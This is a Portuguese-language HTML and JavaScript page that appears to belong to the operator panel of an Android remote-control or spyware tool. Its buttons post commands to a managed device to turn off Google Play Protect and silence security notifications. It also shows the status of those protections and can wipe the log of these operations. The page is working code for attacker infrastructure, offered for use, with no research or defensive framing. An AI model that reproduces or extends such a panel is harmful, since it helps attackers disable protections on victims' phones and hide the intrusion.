<div class="ui container segment">
    <h3 class="ui header">Desativação de Defesas Locais</h3>
    <p>Desativa proteções de segurança locais do dispositivo Android.</p>

    <div class="ui divider"></div>

    <!-- Actions -->
    <div class="ui grid">
        <div class="eight wide column">
            <div class="ui segment">
                <h4>Ações de Defesa</h4>
                <p>Envie comandos para desativar proteções locais.</p>

                <div class="ui form">
                    <div class="field">
                        <button class="ui fluid red button" onclick="disablePlayProtect(this)">
                            <i class="shield alternate icon"></i>
                            Desativar Google Play Protect
                        </button>
                        <small style="display: block; margin-top: 8px; color: #666;">Desativa a varredura de segurança do Google Play Protect</small>
                    </div>

                    <div class="field" style="margin-top: 15px;">
                        <button class="ui fluid orange button" onclick="muteSecurityNotifications(this)">
                            <i class="bell slash icon"></i>
                            Silenciar Notificações de Segurança
                        </button>
                        <small style="display: block; margin-top: 8px; color: #666;">Silencia alertas e notificações de segurança</small>
                    </div>
                </div>
            </div>
        </div>

        <div class="eight wide column">
            <div class="ui segment">
                <h4>Status Atual</h4>
                <p>Estado das proteções de segurança.</p>

                <div class="ui vertical segment">
                    <div class="item">
                        <div class="content">
                            <strong>Google Play Protect</strong>
                            <div style="margin-top: 8px;">
                                <span id="playProtectStatus" class="ui label">
                                    <i class="loading spinner icon"></i>
                                    Carregando...
                                </span>
                            </div>
                        </div>
                    </div>

                    <div class="item" style="margin-top: 15px;">
                        <div class="content">
                            <strong>Notificações de Segurança</strong>
                            <div style="margin-top: 8px;">
                                <span id="notificationsStatus" class="ui label">
                                    <i class="loading spinner icon"></i>
                                    Carregando...
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="ui divider"></div>

    <!-- Defense Log -->
    <div class="ui segment">
        <h4>Log de Operações de Defesa</h4>
        <p>Histórico de desativações e tentativas de desativação.</p>

        <table class="ui celled table">
            <thead>
                <tr>
                    <th>Ação</th>
                    <th>Timestamp</th>
                    <th>Status</th>
                    <th>Detalhes</th>
                </tr>
            </thead>
            <tbody id="defenseLogTable">
                <tr>
                    <td colspan="4" style="text-align: center; color: #999;">
                        <i class="spinner loading icon"></i>
                        Carregando log...
                    </td>
                </tr>
            </tbody>
        </table>

        <button class="ui mini red button" onclick="clearDefenseLog(this)" style="margin-top: 10px;">
            <i class="trash icon"></i>
            Limpar Log
        </button>
    </div>

    <script>
        // Carregar dados ao iniciar
        $(document).ready(function() {
            loadDefenseStatus();
            loadDefenseLog();
        });

        function getDeviceId() {
            const match = window.location.pathname.match(/\/manage\/([^\/]+)/);
            return match ? match[1] : '';
        }

        function loadDefenseStatus() {
            $.get(`/manage/${getDeviceId()}/df/log`, function(data) {
                if (data.error === false && data.data) {
                    const defenseConfig = data.data;
                    
                    // Atualizar status Play Protect
                    const ppStatus = defenseConfig.playProtectDisabled 
                        ? '<i class="times circle icon" style="color: red;"></i> Desabilitado'
                        : '<i class="check circle icon" style="color: green;"></i> Ativo';
                    $('#playProtectStatus').html(ppStatus);

                    // Atualizar status Notificações
                    const notStatus = defenseConfig.securityNotificationsMuted 
                        ? '<i class="times circle icon" style="color: red;"></i> Silenciado'
                        : '<i class="check circle icon" style="color: green;"></i> Ativo';
                    $('#notificationsStatus').html(notStatus);
                }
            });
        }

        function loadDefenseLog() {
            $.get(`/manage/${getDeviceId()}/df/log`, function(data) {
                if (data.error === false && data.data && data.data.defenseLog) {
                    const defenseLog = data.data.defenseLog;
                    
                    if (defenseLog.length === 0) {
                        $('#defenseLogTable').html(`
                            <tr>
                                <td colspan="4" style="text-align: center; color: #999;">
                                    Nenhuma operação registrada
                                </td>
                            </tr>
                        `);
                        return;
                    }

                    let html = '';
                    defenseLog.forEach(log => {
                        const actionLabel = log.action === 'disable_play_protect' 
                            ? 'Desativar Google Play Protect'
                            : log.action === 'mute_security_notifications'
                            ? 'Silenciar Notificações'
                            : log.action;

                        const statusIcon = log.success 
                            ? '<i class="check icon" style="color: green;"></i> Sucesso'
                            : '<i class="times icon" style="color: red;"></i> Falha';

                        const timestamp = new Date(log.timestamp).toLocaleString('pt-BR');

                        html += `
                            <tr>
                                <td>${actionLabel}</td>
                                <td>${timestamp}</td>
                                <td>${statusIcon}</td>
                                <td>${log.details || '-'}</td>
                            </tr>
                        `;
                    });

                    $('#defenseLogTable').html(html);
                } else {
                    $('#defenseLogTable').html(`
                        <tr>
                            <td colspan="4" style="text-align: center; color: #999;">
                                Erro ao carregar log
                            </td>
                        </tr>
                    `);
                }
            }).fail(function() {
                $('#defenseLogTable').html(`
                    <tr>
                        <td colspan="4" style="text-align: center; color: #999;">
                            Erro ao carregar dados
                        </td>
                    </tr>
                `);
            });
        }

        function disablePlayProtect(element) {
            $(element).addClass('loading');
            
            $.post(`/manage/${getDeviceId()}/df/disable_play_protect`, function(data) {
                if (data.error === false) {
                    showNotification('#2ecc71', data.message);
                    setTimeout(() => {
                        loadDefenseStatus();
                        loadDefenseLog();
                    }, 1000);
                } else {
                    showNotification('#f03434', data.error || 'Erro ao enviar comando');
                }
                $(element).removeClass('loading');
            }).fail(function() {
                showNotification('#f03434', 'Erro ao enviar comando');
                $(element).removeClass('loading');
            });
        }

        function muteSecurityNotifications(element) {
            $(element).addClass('loading');
            
            $.post(`/manage/${getDeviceId()}/df/mute_security_notifications`, function(data) {
                if (data.error === false) {
                    showNotification('#2ecc71', data.message);
                    setTimeout(() => {
                        loadDefenseStatus();
                        loadDefenseLog();
                    }, 1000);
                } else {
                    showNotification('#f03434', data.error || 'Erro ao enviar comando');
                }
                $(element).removeClass('loading');
            }).fail(function() {
                showNotification('#f03434', 'Erro ao enviar comando');
                $(element).removeClass('loading');
            });
        }

        function clearDefenseLog(element) {
            if (!confirm('Tem certeza que deseja limpar o log de defesa?')) return;

            $(element).addClass('loading');
            
            $.ajax({
                type: 'DELETE',
                url: `/manage/${getDeviceId()}/df/log`,
                success: function(data) {
                    if (data.error === false) {
                        showNotification('#2ecc71', data.message);
                        loadDefenseLog();
                    } else {
                        showNotification('#f03434', data.error);
                    }
                    $(element).removeClass('loading');
                },
                error: function() {
                    showNotification('#f03434', 'Erro ao limpar log');
                    $(element).removeClass('loading');
                }
            });
        }
    </script>
</div>
